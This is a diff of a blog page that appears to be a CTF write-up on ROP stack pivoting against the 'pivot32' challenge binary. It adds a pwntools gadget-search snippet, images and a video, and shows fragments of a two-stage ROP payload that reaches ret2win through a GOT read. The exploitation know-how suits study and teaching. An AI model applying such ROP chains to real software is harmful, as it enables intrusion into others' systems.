@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.60.1" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.0" />
         
 
         
@@ -237,7 +237,14 @@ Gadgets
 <li>Use the <code>xchg</code> gadget to pivot to this exact address.</li>
 </ol>
 <p>The <code>pop eax</code> gadget has been found with <code>radare2</code> using <code>/R pop eax</code>, but using <code>pwntools</code> to search for it dynamically using the binary is also a way to do it:</p>
-<!-- raw HTML omitted -->
+<center>
+![Let's Search It](/img/binary-rop-stackpivot/snoop_search.gif)
+</center>
+```
+elf = ELF("./pivot32")
+elfROP = ROP(elf)
+POP_EAX = p32(elfROP.find_gadget(["pop eax", "ret"])[0])
+```
 <p>With all this information gathered, the stack pivoting first stage payload looks like this:</p>
 <pre><code>POP_EAX = p32(elfROP.find_gadget([&quot;pop eax&quot;, &quot;ret&quot;])[0])
 DO_PIVOT = p32(0x080488c2)  # xchg eax esp
@@ -273,8 +280,14 @@ STAGE2 += ADD_EAX_EBX  # Add the offset to EAX
 STAGE2 += CALL_EAX  # Call @ the calculated ret2win address
 </code></pre><p>All gadgets have been determined using the <code>/R</code> ROP gadget search function of <code>radare2</code>. The <code>MOV EAX, [EAX]</code> instruction causes the content of the GOT entry of <code>foothold_function()</code> to be read and stored into <code>EAX</code>. On runtime this contains the real address of this function since its dynamic resolution has already taken place.</p>
 <p>Let's see it in action, starting with the execution of the first stage ROP payload. Be sure to watch the stack and the registers change:</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<center>
+<video width="100%" height="100%" controls preload>
+    <source src="/img/binary-rop-stackpivot/rop.webm"></source>
+</video>
+</center>
+<center>
+![ROP It Like It's Hot](/img/binary-rop-stackpivot/snoop_ok.webp)
+</center>
 <p>That's It!</p>
 </div>
 
@@ -286,6 +299,33 @@ STAGE2 += CALL_EAX  # Call @ the calculated ret2win address
     <h4 class="page-header">Related</h4>
 
      <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/uaf-1/">Exploiting A Use-After-Free With radare2 - CTF Challenge</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/cutter"><kbd class="item-tag">cutter</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/heap"><kbd class="item-tag">heap</kbd></a>
+    
+
+</div>
+  <div class="item">
 
     
     
@@ -324,27 +364,6 @@ STAGE2 += CALL_EAX  # Call @ the calculated ret2win address
     <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
     
     <a href="https://bananamafia.dev/tags/arm"><kbd class="item-tag">arm</kbd></a>
-    
-
-</div>
-  <div class="item">
-
-    
-    
-    
-
-    
-
-    <h4><a href="/post/frida-fuzz/">In-Process Fuzzing With Frida</a></h4>
-    <h5></h5>
-    
-    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/fuzzing"><kbd class="item-tag">fuzzing</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
     
 
 </div>
